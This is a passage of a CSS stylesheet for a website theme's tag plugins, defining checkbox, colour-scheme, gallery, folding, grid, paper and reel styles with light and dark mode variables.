var(--site-bg); } .md-text .tag-plugin.checkbox input[type=checkbox]:before { left: 1px; top: 5px; width: 0px; height: 2px; transform: rotate(45deg); -webkit-transform: rotate(45deg); -moz-transform: rotate(45deg); -ms-transform: rotate(45deg); -o-transform: rotate(45deg); } .md-text .tag-plugin.checkbox input[type=checkbox]:after { right: 7px; bottom: 3px; width: 2px; height: 0px; transform: rotate(40deg); -webkit-transform: rotate(40deg); -moz-transform: rotate(40deg); -ms-transform: rotate(40deg); -o-transform: rotate(40deg); } .md-text .tag-plugin.checkbox input[type=checkbox]:checked:before { left: 0px; top: 7px; width: 6px; height: 2px; } .md-text .tag-plugin.checkbox input[type=checkbox]:checked:after { right: 3px; bottom: 1px; width: 2px; height: 10px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:before { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:after { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=minus] input[type=checkbox]:checked:after { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:before { transform: rotate(0); left: 1px; top: 5px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:after { transform: rotate(0); left: 5px; top: 1px; width: 2px; height: 0px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=plus] input[type=checkbox]:checked:after { left: 5px; top: 1px; width: 2px; height: 10px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:before { transform: rotate(45deg); left: 3px; top: 1px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:after { transform: rotate(135deg); right: 3px; top: 1px; width: 0px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:checked:before { left: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox[symbol=times] input[type=checkbox]:checked:after { right: 1px; top: 5px; width: 10px; height: 2px; } .md-text .tag-plugin.checkbox input[type=radio] { border-radius: 50%; transform: translateY(-1px); } .md-text .tag-plugin.checkbox input[type=radio]:before { content: \"\"; display: block; width: 8px; height: 8px; border-radius: 50%; margin: 2px; transform: scale(0); } .md-text .tag-plugin.checkbox input[type=radio]:checked:before { transform: scale(1); } .md-text .tag-plugin.checkbox input { border: 2px solid var(--theme); } .md-text .tag-plugin.checkbox input[type=checkbox]:checked { background: var(--theme); } .md-text .tag-plugin.checkbox input[type=radio]:checked:before { background: var(--theme); } .tag-plugin.checkbox:not([color]) { --theme: #2196f3; } .tag-plugin { --theme: var(--text-p1); --theme-border: var(--block-border); --theme-block: var(--block); --theme-codeblock: var(--block); } .colorful[color='red'] { --theme: #f44336; --theme-border: #e6b6b3; --theme-block: #fddbd8; --theme-codeblock: #f9edec; --text: #3f1512; --text-p1: #4f1b17; --text-p2: #740e06; } .colorful[color='orange'] { --theme: #fa6400; --theme-border: #e6c7b3; --theme-block: #fde7d8; --theme-codeblock: #f9f1ec; --text: #3f2412; --text-p1: #4f2d17; --text-p2: #743206; } .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #e6d6b3; --theme-block: #fdf2d8; --theme-codeblock: #f9f5ec; --text: #3f3112; --text-p1: #4f3e17; --text-p2: #745206; } .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #e6e0b3; --theme-block: #fdf9d8; --theme-codeblock: #f9f7ec; --text: #3f3b12; --text-p1: #4f4917; --text-p2: #746906; } .colorful[color='green'] { --theme: #3dc550; --theme-border: #b3e6ba; --theme-block: #d8fddd; --theme-codeblock: #ecf9ee; --text: #123f19; --text-p1: #174f1f; --text-p2: #067416; } .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #b3dbe6; --theme-block: #d8f5fd; --theme-codeblock: #ecf6f9; --text: #12363f; --text-p1: #17434f; --text-p2: #065d74; } .colorful[color='blue'] { --theme: #2196f3; --theme-border: #b3cfe6; --theme-block: #d8edfd; --theme-codeblock: #ecf3f9; --text: #122b3f; --text-p1: #17364f; --text-p2: #064374; } .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #deb3e6; --theme-block: #f8d8fd; --theme-codeblock: #f7ecf9; --text: #39123f; --text-p1: #47174f; --text-p2: #640674; } .colorful[color='theme'] { --theme: #1cd0fd; --theme-border: #b3dbe6; --theme-block: #d8f6fd; --theme-codeblock: #ecf6f9; --text: #12363f; --text-p1: #17444f; --text-p2: #065e74; } .colorful[color='accent'] { --theme: #ff5724; --theme-border: #e6beb3; --theme-block: #fde1d8; --theme-codeblock: #f9efec; --text: #3f1d12; --text-p1: #4f2417; --text-p2: #742006; } .colorful[color='light'] { --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } .colorful[color='dark'] { --theme-block: #333; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } .colorful[color='warning'] { --theme: #f2e03d; --theme-border: #ffe659; --theme-block: #ffe659; --theme-link: #ff453a; } .colorful[color='error'] { --theme: #f2e03d; --theme-border: #ff453a; --theme-block: #ff453a; --theme-link: #ffe659; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root[data-theme=\"dark\"] .tag-plugin.tag { --theme: #1cd0fd; --theme-border: #1f505c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3f0ff; --text-p1: #9fd2df; --text-p2: #7edaf1; } :root[data-theme=\"dark\"] .colorful[color='red'] { --theme: #f44336; --theme-border: #5c231f; --theme-block: #2f2322; --theme-codeblock: #332928; --text: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } :root[data-theme=\"dark\"] .colorful[color='orange'] { --theme: #fa6400; --theme-border: #5c371f; --theme-block: #2f2722; --theme-codeblock: #332d28; --text: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } :root[data-theme=\"dark\"] .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #5c491f; --theme-block: #2f2b22; --theme-codeblock: #333028; --text: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } :root[data-theme=\"dark\"] .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #5c561f; --theme-block: #2f2e22; --theme-codeblock: #333228; --text: #fff7b3; --text-p1: #dfd99f; --text-p2: #f1e57e; } :root[data-theme=\"dark\"] .colorful[color='green'] { --theme: #3dc550; --theme-border: #1f5c27; --theme-block: #222f24; --theme-codeblock: #28332a; --text: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } :root[data-theme=\"dark\"] .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #1f4f5c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } :root[data-theme=\"dark\"] .colorful[color='blue'] { --theme: #2196f3; --theme-border: #1f415c; --theme-block: #222a2f; --theme-codeblock: #282f33; --text: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } :root[data-theme=\"dark\"] .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #531f5c; --theme-block: #2d222f; --theme-codeblock: #322833; --text: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } :root[data-theme=\"dark\"] .colorful[color='light'] { --theme-border: #fff; --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } :root[data-theme=\"dark\"] .colorful[color='dark'] { --theme-border: #000; --theme-block: #111; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root[data-theme=\"dark\"] .colorful[color='warning'], :root[data-theme=\"dark\"] .colorful[color='light'] { --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .tag-plugin.tag { --theme: #1cd0fd; --theme-border: #1f505c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3f0ff; --text-p1: #9fd2df; --text-p2: #7edaf1; } :root:not([data-theme]) .colorful[color='red'] { --theme: #f44336; --theme-border: #5c231f; --theme-block: #2f2322; --theme-codeblock: #332928; --text: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } :root:not([data-theme]) .colorful[color='orange'] { --theme: #fa6400; --theme-border: #5c371f; --theme-block: #2f2722; --theme-codeblock: #332d28; --text: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } :root:not([data-theme]) .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #5c491f; --theme-block: #2f2b22; --theme-codeblock: #333028; --text: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } :root:not([data-theme]) .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #5c561f; --theme-block: #2f2e22; --theme-codeblock: #333228; --text: #fff7b3; --text-p1: #dfd99f; --text-p2: #f1e57e; } :root:not([data-theme]) .colorful[color='green'] { --theme: #3dc550; --theme-border: #1f5c27; --theme-block: #222f24; --theme-codeblock: #28332a; --text: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } :root:not([data-theme]) .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #1f4f5c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } :root:not([data-theme]) .colorful[color='blue'] { --theme: #2196f3; --theme-border: #1f415c; --theme-block: #222a2f; --theme-codeblock: #282f33; --text: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } :root:not([data-theme]) .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #531f5c; --theme-block: #2d222f; --theme-codeblock: #322833; --text: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } :root:not([data-theme]) .colorful[color='light'] { --theme-border: #fff; --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } :root:not([data-theme]) .colorful[color='dark'] { --theme-border: #000; --theme-block: #111; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root:not([data-theme]) .colorful[color='warning'], :root:not([data-theme]) .colorful[color='light'] { --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } } .md-text .tag-plugin.copy { display: flex; justify-content: space-between; box-sizing: border-box; background: var(--card); border-radius: 8px; border: 1px solid var(--block-border); overflow: hidden; width: 100%; min-width: 200px; } .md-text .tag-plugin.copy span { line-height: 3; padding: 0 1rem; background: var(--block); border-right: 1px solid var(--block-border); color: var(--text-p3); font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; font-weight: 700; flex-shrink: 0; } .md-text .tag-plugin.copy input.copy-area { display: inline-block; padding: 0; width: 100%; color: var(--text-p2); line-height: 3; text-indent: 1rem; } .md-text .tag-plugin.copy button.copy-btn { margin: 2px; border-radius: calc(8px - 2px); display: inline-block; background: none; line-height: 0; font-size: 1rem; padding: 0 0.75rem; color: var(--text-p2); } .md-text .tag-plugin.copy button.copy-btn:hover { background: var(--block-hover); } .md-text .tag-plugin.emoji { display: inline-block; margin: -4px 2px 0; vertical-align: middle; } .md-text .tag-plugin.emoji img { display: block; object-fit: contain; height: 1.75em; border-radius: 0; } .tag-plugin.folders { margin: var(--gap-p) 0; --fsp: calc(17px - 2px); font-size: var(--fsp); border-top: 1px solid var(--block-border); overflow: hidden; } .tag-plugin.folders .folder { border-bottom: 1px solid var(--block-border); padding: 1rem; } .tag-plugin.folders summary { cursor: pointer; color: var(--text-p2); font-weight: 500; position: relative; line-height: 1.2; outline: none; padding: 1rem; margin: -1rem; } .tag-plugin.folders summary:last-child { border-bottom: none; } .tag-plugin.folders summary > span { margin-left: 0.25em; } .tag-plugin.folders summary > p, .tag-plugin.folders summary > h1, .tag-plugin.folders summary > h2, .tag-plugin.folders summary > h3, .tag-plugin.folders summary > h4, .tag-plugin.folders summary > h5, .tag-plugin.folders summary > h6 { display: inline; border-bottom: none !important; } .tag-plugin.folders summary:hover { color: var(--text); } .tag-plugin.folders summary:after { position: absolute; content: '+'; text-align: center; top: 50%; transform: translateY(-50%); right: 1rem; } .tag-plugin.folders details[open] >summary { color: var(--text-p1); font-weight: 700; } .tag-plugin.folders details[open] >summary:after { content: '-'; } .tag-plugin.folders details[open] >div.body { --fsp: calc(17px - 1px); } .tag-plugin.folders details[open] >div.body >:first-child { margin-top: 1rem; } .tag-plugin.folders details[open] >div.body >:last-child { margin-bottom: 0; } details.folding { display: block; padding: 1rem; margin: 1rem 0; border-radius: 12px; background: var(--theme-block); border: 1px solid var(--theme-border); } details.folding summary { cursor: pointer; padding: 1rem; margin: -1rem; color: var(--text-p2); font-weight: 500; --fsp: calc(17px - 2px); font-size: var(--fsp); position: relative; line-height: 1.2; outline: none; } details.folding summary > span { margin-left: 0.25em; } details.folding summary > p, details.folding summary > h1, details.folding summary > h2, details.folding summary > h3, details.folding summary > h4, details.folding summary > h5, details.folding summary > h6 { display: inline; border-bottom: none !important; } details.folding summary:hover { color: var(--text); } details.folding summary:after { position: absolute; content: '+'; text-align: center; top: 50%; transform: translateY(-50%); right: 1rem; line-height: 1; } details.folding[open] >summary { color: var(--text-p1); font-weight: 700; z-index: 1; } details.folding[open] >summary:after { content: '-'; } details.folding[open] >div.body { padding: 0 1rem 1rem; margin: 0 -1rem -1rem; color: var(--text-p1); --fsp: calc(17px - 1px); } details.folding[open] >div.body >:first-child { margin-top: 1rem; } details.folding[open] >div.body >:last-child { margin-bottom: 0; } details.folding[child=codeblock]>div.body { padding: 0; background: transparent; overflow: hidden; } details.folding[child=codeblock]>div.body .highlight { border: none; border-radius: 0; background: transparent; margin: 0; } details.folding[child=codeblock]>div.body .highlight figcaption { display: none; } details.folding[child=codeblock]>div.body .highlight figcaption span { background: var(--theme-block); } details.folding[child=codeblock]>div.body .highlight .code:before { content: none; } details.folding[child=codeblock]>div.body .highlight+.highlight { border-top: 1px dashed var(--theme-border); border-top-left-radius: 0; border-top-right-radius: 0; } details.folding[child=iframe] { overflow: hidden; background: none; } details.folding[child=iframe] >summary { background: none; } details.folding[child=iframe] >div.body { padding: 0; background: none; overflow: hidden; } .md-text .frame-wrap { position: relative; overflow: hidden; margin: 0 auto; max-width: 100%; display: flex; flex-direction: column; align-items: center; } .md-text .frame-wrap img, .md-text .frame-wrap video { border-radius: 0; } .md-text .frame-wrap .frame { z-index: 1; display: block; position: absolute; background-size: 100%; background-repeat: no-repeat; overflow: hidden; } .md-text .tag-plugin.img-wrap .frame-wrap[focus] { height: auto; } .md-text .frame-wrap#iphone11 img, .md-text .frame-wrap#iphone11 video { width: 287px; margin-top: 19px; margin-bottom: 20px; } .md-text .frame-wrap#iphone11 .frame { background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/frame/iphone11.svg\"); width: 329px; height: 658px; } .md-text .frame-wrap[focus='top'] img, .md-text .frame-wrap[focus='top'] video { margin-bottom: 0 !important; } .md-text .frame-wrap:not([focus='bottom']) .frame { top: 0; } .md-text .frame-wrap[focus='bottom'] img, .md-text .frame-wrap[focus='bottom'] video { bottom: 0; margin-top: 0 !important; } .md-text .frame-wrap[focus='bottom'] .frame { bottom: 0; } @media screen and (max-width: 500px) { .md-text .frame-wrap#iphone11 img, .md-text .frame-wrap#iphone11 video { width: 208px; margin-top: 13px; margin-bottom: 14px; } .md-text .frame-wrap#iphone11 .frame { width: 238px; height: 476px; } } .users-wrap .grid-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); } .users-wrap .user-card .card-link { color: var(--text-p1); font-size: 10px; font-weight: 500; display: flex; justify-content: flex-start; flex-direction: column; align-items: center; text-align: center; line-height: 1.2; border-radius: 4px; overflow: hidden; position: relative; padding: 1rem 0.5rem; } .users-wrap .user-card .card-link .name { max-width: 100%; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .users-wrap .user-card .card-link img { object-fit: cover; display: block; width: 48px; height: 48px; background: var(--card); border-radius: 64px; margin: 0 0 0.5rem; } .users-wrap .user-card .card-link >img { transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -moz-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -webkit-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -o-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; } .users-wrap .user-card .card-link:hover { background: var(--block-hover); } .users-wrap .user-card .card-link:hover img { transform: scale(1.2) rotate(8deg); box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); } .tag-plugin.gallery .grid-cell, .tag-plugin.gallery .flow-cell { display: block; overflow: hidden; z-index: 0; position: relative; } .tag-plugin.gallery .grid-cell:hover .image-meta, .tag-plugin.gallery .flow-cell:hover .image-meta { background: rgba(0,0,0,0.5); } .tag-plugin.gallery .grid-cell:hover .image-caption, .tag-plugin.gallery .flow-cell:hover .image-caption { color: #fff; } .tag-plugin.gallery img { object-fit: cover; max-height: 100%; display: block; } .tag-plugin.gallery .image-meta { position: absolute; z-index: 1; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; background: transparent; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; display: flex; flex-direction: column; justify-content: flex-end; } .tag-plugin.gallery .image-meta .image-caption { display: block; font-size: 0.8125rem; color: transparent; pointer-events: none; line-height: 1.2; margin: 0.5rem; transition: color 0.2s ease-out; -moz-transition: color 0.2s ease-out; -webkit-transition: color 0.2s ease-out; -o-transition: color 0.2s ease-out; text-align: left; } .tag-plugin.gallery .image-meta .image-caption:empty { display: none; } .tag-plugin.gallery .grid-cell >img { transition: transform 0.5s ease-out; -moz-transition: transform 0.5s ease-out; -webkit-transition: transform 0.5s ease-out; -o-transition: transform 0.5s ease-out; } .tag-plugin.gallery .grid-cell:hover >img { transform: scale(1.1); } .tag-plugin.gallery.grid-box { display: grid; } .tag-plugin.gallery.grid-box[size='xs'] { grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); grid-gap: 2px; } .tag-plugin.gallery.grid-box[size='xs'] .grid-cell, .tag-plugin.gallery.grid-box[size='xs'] img { border-radius: 2px; } .tag-plugin.gallery.grid-box[size='xs'] .image-caption { font-size: 0.75rem; } .tag-plugin.gallery.grid-box[size='s'] { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); grid-gap: 2px; } .tag-plugin.gallery.grid-box[size='s'] .grid-cell, .tag-plugin.gallery.grid-box[size='s'] img { border-radius: 2px; } .tag-plugin.gallery.grid-box[size='m'] { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 4px; } .tag-plugin.gallery.grid-box[size='m'] .grid-cell, .tag-plugin.gallery.grid-box[size='m'] img { border-radius: 4px; } .tag-plugin.gallery.grid-box[size='l'] { grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); grid-gap: 8px; } .tag-plugin.gallery.grid-box[size='l'] .grid-cell, .tag-plugin.gallery.grid-box[size='l'] img { border-radius: 8px; } .tag-plugin.gallery.grid-box[size='xl'] { grid-template-columns: repeat(2, 1fr); grid-gap: 16px; } .tag-plugin.gallery.grid-box[size='xl'] .grid-cell, .tag-plugin.gallery.grid-box[size='xl'] img { border-radius: 16px; } .tag-plugin.gallery.grid-box[size='mix'] { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 4px; } .tag-plugin.gallery.grid-box[size='mix'] .grid-cell, .tag-plugin.gallery.grid-box[size='mix'] img { border-radius: 4px; } .tag-plugin.gallery.grid-box[size='mix'] .grid-cell:nth-child(3n+1) { grid-column: auto/span 2; grid-row: auto/span 2; } .tag-plugin.gallery.grid-box[ratio='square'] .grid-cell { aspect-ratio: 1; } .tag-plugin.gallery.grid-box[ratio='portrait'] .grid-cell { aspect-ratio: 2/3; } .tag-plugin.gallery.grid-box .grid-cell { background: var(--block); } .tag-plugin.gallery.grid-box .grid-cell img { width: 100%; height: 100%; } .tag-plugin.gallery.flow-box { column-count: 3; column-gap: 8px; } .tag-plugin.gallery.flow-box .flow-cell { border-radius: 8px; padding-bottom: 8px; } .tag-plugin.gallery.flow-box .flow-cell img { width: 100%; height: 100%; } .tag-plugin.gallery.flow-box .image-meta { border-radius: 8px; margin-bottom: 8px; } .tag-plugin.ghcard { line-height: 0; } .tag-plugin.ghcard a.ghcard { display: inline-block; } .tag-plugin.grid { display: grid; grid-gap: 16px; } .tag-plugin.grid[bg]>.cell> p { line-height: 1.5; } .tag-plugin.grid[bg]>.cell> :first-child { margin-top: 0; } .tag-plugin.grid[bg]>.cell> :last-child { margin-bottom: 0; } .tag-plugin.grid[bg]>.cell> p:first-child { margin-top: -0.25em; } .tag-plugin.grid[bg]>.cell> p:last-child { margin-bottom: -0.25em; } .tag-plugin.grid[bg]>.cell { padding: 1rem; border-radius: 12px; } .tag-plugin.grid[bg='box']>.cell { background: var(--block); } .tag-plugin.grid[bg='card']>.cell { background: var(--card); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .tag-plugin.grid[bg='card']>.cell { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .md-text .tag-plugin.hashtag { padding: 0px 8px; border-radius: 100px; background: var(--theme-block); color: var(--text-p2); margin: 2px 0; display: inline-flex; align-items: center; --fsp: calc(17px - 2px); font-size: var(--fsp); font-weight: 500; transition: background 0.2s ease-out, color 0.2s ease-out; -moz-transition: background 0.2s ease-out, color 0.2s ease-out; -webkit-transition: background 0.2s ease-out, color 0.2s ease-out; -o-transition: background 0.2s ease-out, color 0.2s ease-out; } .md-text .tag-plugin.hashtag span { margin: 0 2px; } .md-text .tag-plugin.hashtag:hover { background: var(--text-p2); color: var(--theme-block); } span.tag-plugin.icon { display: inline-block; margin: -4px 1px 0; vertical-align: middle; } span.tag-plugin.icon svg, span.tag-plugin.icon img { display: block; height: 1.5em; width: auto; } span.tag-plugin.icon svg { color: var(--theme); } span.tag-plugin.icon img { object-fit: contain; } p>strong>span.tag-plugin.icon { margin: -4px 4px 0 0; } .tag-plugin.icon-wrap span.tag-plugin.icon { margin-right: 4px; } .tag-plugin.image { margin-top: 1rem; margin-bottom: 1rem; } .tag-plugin.image .image-bg { text-align: center; border-radius: 12px; position: relative; overflow: hidden; } .tag-plugin.image .image-bg:hover .image-download { opacity: 1 !important; } .tag-plugin.image .image-bg img { display: block; object-fit: cover; } .tag-plugin.image .image-bg .image-download { position: absolute; bottom: 8px; right: 8px; font-size: 1.125rem; padding: 6px; line-height: 0; border-radius: 40px; transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -moz-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -webkit-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -o-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; color: var(--text-p1); } .tag-plugin.image .image-bg .image-download:hover { background: var(--card) !important; color: #1cd0fd; } .tag-plugin.image .image-meta { display: flex; justify-content: center; padding: 0.5rem 0; } .tag-plugin.image .image-meta .image-caption { display: inline-block; font-size: 0.8125rem; color: var(--text-p2); line-height: 1.5; text-align: justify; } .tag-plugin.image .image-meta .image-caption:empty { display: none; } .md-text .tag-plugin.paper { display: flex; flex-direction: column; align-items: center; padding-top: var(--gap-padding); padding-bottom: var(--gap-padding); } .md-text .tag-plugin.paper >.content { border-left: 1px dashed var(--text-meta); border-right: 1px dashed var(--text-meta); border-bottom: 1px dashed var(--text-meta); border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; padding: 1rem; max-width: calc(95%); } .md-text .tag-plugin.paper >.content >.title { font-weight: 500; text-align: center; } .md-text .tag-plugin.paper >.content >.meta { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.paper >.content >.body >.paragraph { text-indent: 2em; } .md-text .tag-plugin.paper >.content >.body >.section >.section-title { text-align: center; } .md-text .tag-plugin.paper >.content >.body >.section >.section-content { text-indent: 2em; } .md-text .tag-plugin.paper >.content >.body >.line.right >p { text-align: right; } .md-text .tag-plugin.paper >.content >.body .tag-plugin { margin: 0; } .md-text .tag-plugin.paper >.content >.footer { color: var(--text-p4); font-size: 0.75rem; text-align: right; } .md-text .tag-plugin.paper >.content >.footer >.author-date { text-align: right; } .md-text .tag-plugin.paper >.content >.footer >.author-date >span { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.paper >.content >.footer >.author-date >.author { margin-right: calc(0.5 * var(--gap-p)); } .md-text .tag-plugin.paper>.content { position: relative; } .md-text .tag-plugin.paper>.content:before { content: ''; position: absolute; height: 4px; left: -16px; top: -4px; right: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.paper>.content >.title { position: relative; } .md-text .tag-plugin.paper>.content >.title:before { content: ''; position: absolute; height: 4px; left: calc(-1rem - 6px); top: calc(-1rem - 4px); right: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.paper>.content >.title:after { content: ''; position: absolute; height: 4px; right: calc(-1rem - 6px); top: calc(-1rem - 4px); left: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.paper > .content.underline > .title, .md-text .tag-plugin.paper > .content.underline > .meta, .md-text .tag-plugin.paper > .content.underline > .author-date, .md-text .tag-plugin.paper > .content.underline > .footer, .md-text .tag-plugin.paper > .content.underline > .body { background: linear-gradient(transparent 1.5rem, var(--text-meta) 1px); background-size: 100% calc(1.5rem + 1px); line-height: calc(1.5rem + 1px); padding: 0 3px; } .md-text .tag-plugin.paper > .content.underline p { margin: 0; } .md-text .tag-plugin.paper > .content.underline >.title { border-top: 1px solid var(--text-meta); } .md-text .tag-plugin.reel { display: flex; flex-direction: column; align-items: center; padding-top: var(--gap-padding); padding-bottom: var(--gap-padding); } .md-text .tag-plugin.reel >.content { display: flex; flex-direction: column; writing-mode: vertical-rl; border-top: 1px dashed var(--text-meta); border-bottom: 1px dashed var(--text-meta); max-width: calc(100% - 80px); padding: 1rem; } .md-text .tag-plugin.reel >.content >.title { font-weight: 500; font-size: 1rem; } .md-text .tag-plugin.reel >.content >.meta { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.reel >.content >.body { overflow: auto; margin: calc(var(--gap-padding) - 4px); } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar { height: 4px; width: 4px; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-track-piece { background: transparent; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 2px; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .md-text .tag-plugin.reel >.content >.body .main p { margin: 0; font-size: 0.875rem; } .md-text .tag-plugin.reel >.content >.date { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; text-align: right; } .md-text .tag-plugin.reel >.content >.footer { color: var(--text-p4); font-size: 0.75rem; text-align: right; } .md-text .tag-plugin.reel>.content { position: relative; } .md-text .tag-plugin.reel>.content:before { content: ''; position: absolute; width: 4px; left: -4px; top: -16px; bottom: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.reel>.content:after { content: ''; position: absolute; width: 4px; left: calc(100%); top: -16px; bottom: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.reel>.content >.title { position: relative; } .md-text .tag-plugin.reel>.content >.title:before { content: ''; position: absolute; width: 4px; right: calc(-1rem - 4px); top: calc(-1rem - 6px); bottom: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; z-index: 1; } .md-text .tag-plugin.reel>.content >.title:after { content: ''; position: absolute; width: 4px; right: calc(-1rem - 4px); top: calc(100% + 1rem - 6px); bottom: calc(-1rem - 6px); border-radius: 4px; background: #ff5724; z-index: 1; } .md-text .tag-plugin.reel>.content >.footer { position: relative; } .md-text .tag-plugin.reel>.content >.footer:before { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: calc(-1rem - 6px); bottom: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.reel>.content >.footer:after { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: 